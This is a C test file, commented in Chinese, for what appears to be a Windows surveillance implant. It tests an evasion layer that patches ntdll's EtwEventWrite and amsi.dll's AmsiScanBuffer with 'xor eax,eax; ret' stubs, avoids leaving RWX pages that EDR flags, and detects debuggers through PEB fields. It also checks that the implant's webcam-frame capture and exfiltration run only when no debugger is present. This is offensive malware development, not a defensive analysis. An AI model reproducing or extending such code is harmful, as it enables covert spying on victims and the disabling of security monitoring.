/*
 * agent_windows/tests/test_defend_win.c
 *
 * G3 对抗集成层测试。
 *
 * 覆盖的不是"桩字节对不对"（那是 19_defense 的 test_defense 已验过的），
 * 而是 Windows 专属的三段：
 *   1. 不走 GetProcAddress 的导出解析
 *   2. 保护切换失败时是否真的拒绝动手
 *   3. 打桩后是否恢复保护（残留 RWX 页是 EDR 强特征）
 * 以及编排层的必打/可选语义。
 */
#include "defend_win.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static int g_pass, g_fail;

#define CHECK(cond, msg) do {                                   \
    if (cond) { g_pass++; printf("[PASS] %s\n", msg); }         \
    else      { g_fail++; printf("[FAIL] %s\n", msg); }         \
} while (0)

/* ====================================================================
 * 合成一个带导出表的 PE32+ 映像
 * ==================================================================== */
#define IMG_SIZE   0x2000u
#define TEXT_RVA   0x1000u
#define TEXT_RAW   0x400u
/* RVA -> 文件偏移 */
#define F(rva)     ((rva) - TEXT_RVA + TEXT_RAW)

#define EXP_RVA    0x1100u   /* IMAGE_EXPORT_DIRECTORY */
#define NAMES_RVA  0x1200u   /* 函数名字符串区 */
#define AF_RVA     0x1300u   /* AddressOfFunctions */
#define AN_RVA     0x1310u   /* AddressOfNames */
#define AO_RVA     0x1320u   /* AddressOfNameOrdinals */
#define BODY_RVA   0x1400u   /* 函数体 */

static void wr16(uint8_t *p, uint16_t v)
{ p[0] = (uint8_t)(v & 0xFF); p[1] = (uint8_t)(v >> 8); }
static void wr32(uint8_t *p, uint32_t v)
{
    p[0]=(uint8_t)(v&0xFF); p[1]=(uint8_t)((v>>8)&0xFF);
    p[2]=(uint8_t)((v>>16)&0xFF); p[3]=(uint8_t)((v>>24)&0xFF);
}
static void wr64(uint8_t *p, uint64_t v)
{
    uint32_t i;
    for (i = 0; i < 8; i++) p[i] = (uint8_t)((v >> (8 * i)) & 0xFF);
}

/* funcs: 以 NULL 结尾的函数名数组；函数体 RVA 依次排布在 BODY_RVA + i*0x40 */
static void build_pe_with_exports(uint8_t *b, const char *const *funcs)
{
    uint8_t *opt, *dd, *sh;
    uint32_t i, n = 0;

    memset(b, 0, IMG_SIZE);
    while (funcs[n]) n++;

    /* DOS */
    wr16(b + 0, 0x5A4D);
    wr32(b + 0x3C, 0x80);           /* e_lfanew */

    /* PE\0\0 + COFF */
    b[0x80]='P'; b[0x81]='E'; b[0x82]=0; b[0x83]=0;
    wr16(b + 0x84, 0x8664);         /* AMD64 */
    wr16(b + 0x86, 1);              /* NumberOfSections */
    wr32(b + 0x88, 0);
    wr32(b + 0x8C, 0);
    wr32(b + 0x90, 0);
    wr16(b + 0x94, 240);            /* SizeOfOptionalHeader */
    wr16(b + 0x96, 0x2022);         /* DLL|EXECUTABLE_IMAGE */

    /* Optional (PE32+) */
    opt = b + 0x98;
    wr16(opt + 0,  0x020B);
    wr32(opt + 16, BODY_RVA);       /* AddressOfEntryPoint */
    wr64(opt + 24, 0x10000000ull);  /* ImageBase */
    wr32(opt + 32, 0x1000);         /* SectionAlignment */
    wr32(opt + 36, 0x200);          /* FileAlignment */
    wr32(opt + 56, IMG_SIZE);       /* SizeOfImage */
    wr32(opt + 60, TEXT_RAW);       /* SizeOfHeaders */
    wr16(opt + 68, 3);
    wr16(opt + 70, 0x8160);
    wr32(opt + 108, 16);            /* NumberOfRvaAndSizes */

    dd = opt + 112;
    wr32(dd + 0*8,     EXP_RVA);
    wr32(dd + 0*8 + 4, 40);

    /* Section header */
    sh = b + 0x98 + 240;
    memcpy(sh + 0, ".text\0\0\0", 8);
    wr32(sh + 8,  0x1000);          /* VirtualSize */
    wr32(sh + 12, TEXT_RVA);
    wr32(sh + 16, 0x1000);          /* SizeOfRawData */
    wr32(sh + 20, TEXT_RAW);
    wr32(sh + 36, 0x60000020);      /* CODE|EXECUTE|READ */

    /* 导出目录 */
    wr32(b + F(EXP_RVA) + 12, NAMES_RVA + 0x100);  /* Name（随便指向字符串区） */
    wr32(b + F(EXP_RVA) + 16, 1);                  /* Base */
    wr32(b + F(EXP_RVA) + 20, n);                  /* NumberOfFunctions */
    wr32(b + F(EXP_RVA) + 24, n);                  /* NumberOfNames */
    wr32(b + F(EXP_RVA) + 28, AF_RVA);             /* AddressOfFunctions */
    wr32(b + F(EXP_RVA) + 32, AN_RVA);             /* AddressOfNames */
    wr32(b + F(EXP_RVA) + 36, AO_RVA);             /* AddressOfNameOrdinals */

    for (i = 0; i < n; i++) {
        size_t off = (i == 0) ? 0 : (strlen(funcs[i-1]) + 1);
        uint32_t name_rva = NAMES_RVA;
        uint32_t k;
        for (k = 0; k < i; k++) name_rva += (uint32_t)strlen(funcs[k]) + 1;
        (void)off;

        strcpy((char *)(b + F(name_rva)), funcs[i]);
        wr32(b + F(AN_RVA) + i*4, name_rva);
        wr16(b + F(AO_RVA) + i*2, (uint16_t)i);
        wr32(b + F(AF_RVA) + i*4, BODY_RVA + i*0x40);

        /* 函数体填在【内存偏移】处：dw_resolve_export 返回 base + RVA，
         * 真实加载的映像里 RVA 就是相对基址的偏移，与文件偏移不同。
         * 用可识别的 0xCC 填充，便于断言"是否被改写/改写了多少"。 */
        memset(b + (BODY_RVA + i*0x40), 0xCC, 0x40);
    }
}

/* ====================================================================
 * mock：模块表 + 保护历史
 * ==================================================================== */
#define PHIST 16

typedef struct {
    uint8_t  ntdll[IMG_SIZE];
    uint8_t  amsi[IMG_SIZE];
    int      amsi_loaded;
    int      prot_fail;        /* 所有保护切换失败 */
    int      prot_fail_second; /* 仅第二次（恢复）失败 */
    int      nprot;            /* 保护切换【调用】次数（含失败） */
    int      ncall;            /* 保护切换【成功】次数 */
    int      cur_prot;
    int      hist[PHIST];      /* 成功生效的保护值序列 */
} mock_t;

static int mod_cb(const char *name, void *ud, uint8_t **out_base, size_t *out_size)
{
    mock_t *m = (mock_t *)ud;
    if (!name || !out_base || !out_size) return DW_ERR_ARG;

    if (strcmp(name, "ntdll.dll") == 0) {
        *out_base = m->ntdll; *out_size = IMG_SIZE; return DW_OK;
    }
    if (strcmp(name, "amsi.dll") == 0) {
        if (!m->amsi_loaded) return DW_ERR_NOMODULE;
        *out_base = m->amsi; *out_size = IMG_SIZE; return DW_OK;
    }
    return DW_ERR_NOMODULE;
}

static int mod_h_cb(uint32_t name_hash, void *ud, uint8_t **out_base, size_t *out_size)
{
    mock_t *m = (mock_t *)ud;
    if (!out_base || !out_size) return DW_ERR_ARG;

    if (name_hash == DW_HASH_NTDLL) {
        *out_base = m->ntdll; *out_size = IMG_SIZE; return DW_OK;
    }
    if (name_hash == DW_HASH_AMSI_DLL) {
        if (!m->amsi_loaded) return DW_ERR_NOMODULE;
        *out_base = m->amsi; *out_size = IMG_SIZE; return DW_OK;
    }
    return DW_ERR_NOMODULE;
}

static int prot_cb(void *addr, size_t len, int prot, void *ud, int *out_old)
{
    mock_t *m = (mock_t *)ud;
    (void)addr; (void)len;

    /* 调用次数先自增：失败也是一次真实调用，调用序列本身要可断言 */
    m->nprot++;

    if (m->prot_fail) return DW_ERR_PROTECT;
    /* 第一次放行、第二次（恢复）失败 —— 用于验证"恢复失败也算失败" */
    if (m->prot_fail_second && m->nprot == 2) return DW_ERR_PROTECT;

    if (out_old) *out_old = m->cur_prot;
    if (m->ncall < PHIST) m->hist[m->ncall++] = prot;
    m->cur_prot = prot;
    return DW_OK;
}

static uint8_t g_peb[DW_PEB_MIN_LEN];

static int peb_cb(uint8_t *buf, size_t len, void *ud)
{
    (void)ud;
    if (!buf || len < DW_PEB_MIN_LEN) return DW_ERR_ARG;
    memcpy(buf, g_peb, DW_PEB_MIN_LEN);
    return DW_OK;
}

static void mock_init(mock_t *m)
{
    static const char *const ntdll_x[] = { "EtwEventWrite", "NtQueryInformationProcess", NULL };
    static const char *const amsi_x[]  = { "AmsiScanBuffer", NULL };

    memset(m, 0, sizeof *m);
    build_pe_with_exports(m->ntdll, ntdll_x);
    build_pe_with_exports(m->amsi, amsi_x);
    m->amsi_loaded = 1;
    m->cur_prot    = DW_PROT_RX;   /* 真机代码节：RX，不可写 */
}

/* ====================================================================
 * 用例
 * ==================================================================== */

static void t_resolve(void)
{
    mock_t m; uint8_t *addr = NULL; int r;
    mock_init(&m);

    r = dw_resolve_export(m.ntdll, IMG_SIZE, "EtwEventWrite", &addr);
    CHECK(r == DW_OK && addr != NULL, "解析 EtwEventWrite 成功");
    CHECK(addr == m.ntdll + BODY_RVA, "解析出的地址 == 基址 + 导出 RVA（内存语义）");

    r = dw_resolve_export(m.ntdll, IMG_SIZE, "NoSuchExport", &addr);
    CHECK(r == DW_ERR_NOEXPORT, "不存在的导出 -> NOEXPORT");

    r = dw_resolve_export(m.ntdll, IMG_SIZE, "AmsiScanBuffer", &addr);
    CHECK(r == DW_ERR_NOEXPORT, "ntdll 里查 amsi 的函数 -> NOEXPORT");

    r = dw_resolve_export(NULL, IMG_SIZE, "EtwEventWrite", &addr);
    CHECK(r == DW_ERR_ARG, "空映像 -> ARG");
}

static void t_patch_ok(void)
{
    mock_t m; dw_ctx_t ctx; dw_patch_result_t res; int r;
    mock_init(&m);
    memset(&ctx, 0, sizeof ctx);
    ctx.mod_fn = mod_cb; ctx.prot_fn = prot_cb; ctx.peb_fn = NULL; ctx.ud = &m;

    r = dw_patch_symbol(&ctx, "ntdll.dll", "EtwEventWrite", DW_T_ETW, &res);
    CHECK(r == DW_OK, "ETW 打桩返回 OK");
    CHECK(res.addr != NULL, "回填了打桩地址");
    CHECK(res.restored == 1, "保护已恢复");
    CHECK(res.addr[0] == 0x33 && res.addr[1] == 0xC0 && res.addr[2] == 0xC3,
          "ETW 桩字节为 xor eax,eax; ret");
    CHECK(res.addr[3] == 0xCC, "桩只覆盖 3 字节，未吃掉后续指令");
    CHECK(m.cur_prot == DW_PROT_RX, "最终保护回到原值 RX（未残留 RWX）");
    CHECK(m.nprot == 2, "保护切换恰好 2 次（改 + 恢复）");
    CHECK(m.hist[0] == DW_PROT_RWX && m.hist[1] == DW_PROT_RX,
          "保护变化序列 = RWX -> 原值");
}

static void t_patch_protect_fail(void)
{
    mock_t m; dw_ctx_t ctx; dw_patch_result_t res; int r; uint8_t *body;
    mock_init(&m);
    m.prot_fail = 1;
    memset(&ctx, 0, sizeof ctx);
    ctx.mod_fn = mod_cb; ctx.prot_fn = prot_cb; ctx.peb_fn = NULL; ctx.ud = &m;

    body = m.ntdll + BODY_RVA;
    r = dw_patch_symbol(&ctx, "ntdll.dll", "EtwEventWrite", DW_T_ETW, &res);
    CHECK(r == DW_ERR_PROTECT, "保护切换失败 -> PROTECT（不是 PATCH 也不是 OK）");
    CHECK(body[0] == 0xCC, "保护失败时一个字节都没写（拒绝动手）");
    CHECK(m.nprot == 1, "失败时不再尝试恢复（保护从未改变）");
}

static void t_patch_restore_fail(void)
{
    mock_t m; dw_ctx_t ctx; dw_patch_result_t res; int r;
    mock_init(&m);
    m.prot_fail_second = 1;
    memset(&ctx, 0, sizeof ctx);
    ctx.mod_fn = mod_cb; ctx.prot_fn = prot_cb; ctx.peb_fn = NULL; ctx.ud = &m;

    r = dw_patch_symbol(&ctx, "ntdll.dll", "EtwEventWrite", DW_T_ETW, &res);
    CHECK(r == DW_ERR_PROTECT, "恢复保护失败 -> PROTECT（残留 RWX 不可接受）");
    CHECK(res.restored == 0, "restored 标记为 0");
    CHECK(res.addr[0] == 0x33, "桩字节已写入但保护未恢复（如实记录，不粉饰）");
}

static void t_nomodule_and_noexport(void)
{
    mock_t m; dw_ctx_t ctx; dw_patch_result_t res; int r;
    mock_init(&m);
    m.amsi_loaded = 0;
    memset(&ctx, 0, sizeof ctx);
    ctx.mod_fn = mod_cb; ctx.prot_fn = prot_cb; ctx.peb_fn = NULL; ctx.ud = &m;

    r = dw_patch_symbol(&ctx, "amsi.dll", "AmsiScanBuffer", DW_T_AMSI, &res);
    CHECK(r == DW_ERR_NOMODULE, "amsi.dll 未加载 -> NOMODULE（不是失败）");

    r = dw_patch_symbol(&ctx, "nosuch.dll", "X", DW_T_ETW, &res);
    CHECK(r == DW_ERR_NOMODULE, "未知模块 -> NOMODULE");

    r = dw_patch_symbol(&ctx, "ntdll.dll", "Nope", DW_T_ETW, &res);
    CHECK(r == DW_ERR_NOEXPORT, "模块在但导出不在 -> NOEXPORT");
}

static void t_defend_all(void)
{
    mock_t m; dw_ctx_t ctx; dw_report_t rep; int r;
    mock_init(&m);
    memset(&ctx, 0, sizeof ctx);
    ctx.mod_fn = mod_cb; ctx.prot_fn = prot_cb; ctx.peb_fn = NULL; ctx.ud = &m;

    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_OK, "全部就位 -> OK");
    CHECK(rep.etw.rc == DW_OK && rep.amsi.rc == DW_OK, "ETW 与 AMSI 均已打桩");
    CHECK(rep.amsi_absent == 0, "amsi_absent = 0");

    /* amsi 未加载：必打项仍在，且不算失败 */
    m.amsi_loaded = 0;
    memset(&rep, 0, sizeof rep);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_OK, "amsi.dll 未加载时 defend_all 仍返回 OK");
    CHECK(rep.amsi_absent == 1, "amsi_absent = 1（记为无需修补）");
    CHECK(rep.etw.rc == DW_OK, "ETW 必打项仍成功");

    /* ETW 解析不到：必打项缺失必须报错，不得静默跳过 */
    m.amsi_loaded = 1;
    memset(m.ntdll + F(EXP_RVA), 0, 40);
    memset(&rep, 0, sizeof rep);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r != DW_OK, "ETW 解析失败 -> defend_all 报错（必打项不跳过）");
}

/*
 * 取模块方式的显式选择（dw_ctx_t.mode）。
 *
 * 这组用例的存在理由：修复前 dw_patch_h 用"mod_h_fn 是否非空"决定走哪条路。
 * 调用方一旦漏做 memset，该字段就是栈上的野值，会被当成有效回调直接调用，
 * 表现为随机崩溃、且崩溃点与本次调用无关 —— 本层最难排查的一类故障。
 * 改为 mode 枚举后，未显式声明哈希时绝不碰 mod_h_fn。
 */
static void t_mod_mode(void)
{
    mock_t m; dw_ctx_t ctx; dw_report_t rep; int r;
    mock_init(&m);

    /* 1. 显式走哈希并提供了回调 -> 正常 */
    memset(&ctx, 0, sizeof ctx);
    ctx.mode = DW_MOD_BY_HASH; ctx.mod_h_fn = mod_h_cb;
    ctx.prot_fn = prot_cb; ctx.ud = &m;
    memset(&rep, 0, sizeof rep);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_OK, "mode=BY_HASH 且提供 mod_h_fn -> OK");
    CHECK(rep.etw.rc == DW_OK && rep.amsi.rc == DW_OK, "哈希路径下 ETW/AMSI 均打桩成功");

    /* 2. 声明走哈希却没给回调 -> ARG，不去碰 mod_fn，也不野调 */
    memset(&ctx, 0, sizeof ctx);
    ctx.mode = DW_MOD_BY_HASH; ctx.prot_fn = prot_cb; ctx.ud = &m;
    memset(&rep, 0, sizeof rep);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_ERR_ARG, "mode=BY_HASH 但缺 mod_h_fn -> ARG（不是崩溃）");

    /* 3. 清零后不设 mode -> 安全回落按名（修复前此处依赖野指针） */
    memset(&ctx, 0, sizeof ctx);
    ctx.mod_fn = mod_cb; ctx.prot_fn = prot_cb; ctx.ud = &m;
    memset(&rep, 0, sizeof rep);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_OK, "mode 未显式设置（清零后=BY_NAME）-> 安全回落按名，OK");

    /* 4. 直接复现缺陷：mod_h_fn 是明显的野值，但 mode=BY_NAME 时绝不调用它。
     *    修复前这一条会因调用 0x1 而 SIGSEGV。 */
    memset(&ctx, 0, sizeof ctx);
    ctx.mode     = DW_MOD_BY_NAME;
    ctx.mod_h_fn = (dw_module_h_fn)0x1;   /* 明显非法的野指针 */
    ctx.mod_fn   = mod_cb;
    ctx.prot_fn  = prot_cb;
    ctx.ud       = &m;
    memset(&rep, 0, sizeof rep);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_OK, "mod_h_fn 为野值但 mode=BY_NAME -> 不调用它，OK（修复前必崩）");
}

static void t_debug_peb(void)
{
    dw_debug_info_t d; int r;

    memset(g_peb, 0, sizeof g_peb);
    r = dw_debug_peb(g_peb, sizeof g_peb, NULL, 0, &d);
    CHECK(r == DW_OK && d.valid == 1, "干净 PEB 解析成功");
    CHECK(d.verdict == 0, "干净 PEB 判定为安全");

    g_peb[0x02] = 1;
    dw_debug_peb(g_peb, sizeof g_peb, NULL, 0, &d);
    CHECK(d.verdict != 0, "BeingDebugged=1 -> 判为被调试");

    memset(g_peb, 0, sizeof g_peb);
    g_peb[0xBC] = 0x70;   /* NtGlobalFlag 调试位 */
    dw_debug_peb(g_peb, sizeof g_peb, NULL, 0, &d);
    CHECK(d.verdict != 0, "NtGlobalFlag&0x70 -> 判为被调试");

    memset(g_peb, 0, sizeof g_peb);
    g_peb[0xBC] = 0x01;   /* 非调试位 */
    dw_debug_peb(g_peb, sizeof g_peb, NULL, 0, &d);
    CHECK(d.verdict == 0, "NtGlobalFlag 非调试位不误判");

    /* 缓冲过短：必须报错，不能凭残留内存下结论 */
    r = dw_debug_peb(g_peb, 8, NULL, 0, &d);
    CHECK(r == DW_ERR_ARG && d.valid == 0, "PEB 缓冲过短 -> ARG 且 valid=0");
}

static void t_defend_unsafe_env(void)
{
    mock_t m; dw_ctx_t ctx; dw_report_t rep; int r;
    mock_init(&m);
    memset(&ctx, 0, sizeof ctx);
    ctx.mod_fn = mod_cb; ctx.prot_fn = prot_cb; ctx.peb_fn = peb_cb; ctx.ud = &m;

    memset(g_peb, 0, sizeof g_peb);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_OK, "PEB 干净 -> defend_all OK");
    CHECK(rep.dbg.valid == 1, "报告里带上了 PEB 解析结果");

    g_peb[0x02] = 1;
    memset(&rep, 0, sizeof rep);
    r = dw_defend_all(&ctx, &rep);
    CHECK(r == DW_ERR_UNSAFE, "被调试环境 -> UNSAFE（拒绝运行）");
}

/* ====================================================================
 * 集成：真的接进 implant 的 defend 钩子
 *
 * 前面的用例只证明"模块能跑"。这一组证明"接得上"，并且证明
 * 环境不安全时植入体【一步都不走】——在不安全环境里留下采集痕迹
 * 比什么都不做糟糕得多。
 * ==================================================================== */
#include "implant.h"

static uint64_t g_now = 1000000;
static uint64_t fake_now(void *ud) { (void)ud; return g_now; }

static int g_exfil_calls;

static int h_exfil(const uint8_t *d, size_t n, const char *nm, void *ud)
{ (void)d; (void)n; (void)nm; (void)ud; g_exfil_calls++; return 0; }

static int h_pack(const uint8_t *in, size_t in_len,
                  uint8_t *out, size_t *out_len, void *ud)
{
    (void)ud;
    if (!in || in_len == 0) return -1;
    if (*out_len < in_len + 4) return -1;
    out[0]='P'; out[1]='K'; out[2]=0; out[3]=1;
    memcpy(out + 4, in, in_len);
    *out_len = in_len + 4;
    return 0;
}

typedef struct { dw_ctx_t ctx; dw_report_t rep; } bridge_t;

static int defend_bridge(void *ud)
{
    bridge_t *b = (bridge_t *)ud;
    return dw_defend_all(&b->ctx, &b->rep);
}

static implant_cfg_t cfg_for_integration(void)
{
    implant_cfg_t c;
    memset(&c, 0, sizeof(c));
    c.cam.width        = 640;
    c.cam.height       = 480;
    c.cam.capture_ms   = 3000;
    c.cam.max_frames   = 1;
    c.cam.prefer_mjpeg = true;
    c.interval_ms      = 1000;
    c.jitter_ms        = 0;
    c.max_batches      = 1;
    c.frames_per_batch = 1;
    c.jpeg_quality     = 75;
    c.stop_on_error    = true;
    c.run_defend       = true;   /* 关键：开启对抗自检 */
    return c;
}

static void t_implant_integration(void)
{
    mock_t m; bridge_t b; implant_cfg_t cfg; implant_t *im; implant_err_t e;

    /* ---- 干净环境：应正常跑完并回传 ---- */
    mock_init(&m);
    memset(&b, 0, sizeof b);
    b.ctx.mod_fn = mod_cb; b.ctx.prot_fn = prot_cb; b.ctx.peb_fn = peb_cb; b.ctx.ud = &m;
    memset(&b.rep, 0, sizeof b.rep);
    memset(g_peb, 0, sizeof g_peb);

    cfg = cfg_for_integration();
    im  = implant_create(&cfg, "mock");
    if (!im) { CHECK(0, "implant_create 成功"); return; }
    implant_set_now(im, fake_now, NULL);
    implant_set_pack(im, h_pack, NULL);
    implant_set_exfil(im, h_exfil, NULL);
    implant_set_defend(im, defend_bridge, &b);

    g_exfil_calls = 0;
    e = implant_run(im);
    /* implant_run 跑满 max_batches 后返回 IMPLANT_STOPPED 而非 OK
     * （STOPPED 表示"循环结束"，被 stop() 提前终止也是它）。
     * 注意：这一码同时承载"正常跑完"与"被 stop 终止"两种语义，
     * 调用方无法据此区分——见已知限制。 */
    CHECK(e == IMPLANT_STOPPED, "干净环境：implant_run 正常结束（STOPPED）");
    CHECK(b.rep.etw.rc == DW_OK, "干净环境：defend 里 ETW 打桩成功");
    CHECK(g_exfil_calls == 1, "干净环境：正常回传 1 批");
    implant_destroy(im);

    /* ---- 被调试环境：必须拒绝运行，且一次都不回传 ---- */
    mock_init(&m);
    memset(&b, 0, sizeof b);
    b.ctx.mod_fn = mod_cb; b.ctx.prot_fn = prot_cb; b.ctx.peb_fn = peb_cb; b.ctx.ud = &m;
    memset(&b.rep, 0, sizeof b.rep);
    g_peb[0x02] = 1;   /* BeingDebugged */

    cfg = cfg_for_integration();
    im  = implant_create(&cfg, "mock");
    if (!im) { CHECK(0, "implant_create 成功（不安全环境用例）"); return; }
    implant_set_now(im, fake_now, NULL);
    implant_set_pack(im, h_pack, NULL);
    implant_set_exfil(im, h_exfil, NULL);
    implant_set_defend(im, defend_bridge, &b);

    g_exfil_calls = 0;
    e = implant_run(im);
    CHECK(e == IMPLANT_ERR_DEFEND, "被调试环境：植入体返回 ERR_DEFEND");
    CHECK(g_exfil_calls == 0, "被调试环境：一次都没回传（不留采集痕迹）");
    {
        const implant_stats_t *s = implant_stats(im);
        CHECK(s && s->frames_total == 0, "被调试环境：帧计数为 0");
    }
    implant_destroy(im);
}

int main(void)
{
    t_resolve();
    t_patch_ok();
    t_patch_protect_fail();
    t_patch_restore_fail();
    t_nomodule_and_noexport();
    t_defend_all();
    t_mod_mode();
    t_debug_peb();
    t_defend_unsafe_env();
    t_implant_integration();

    printf("=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
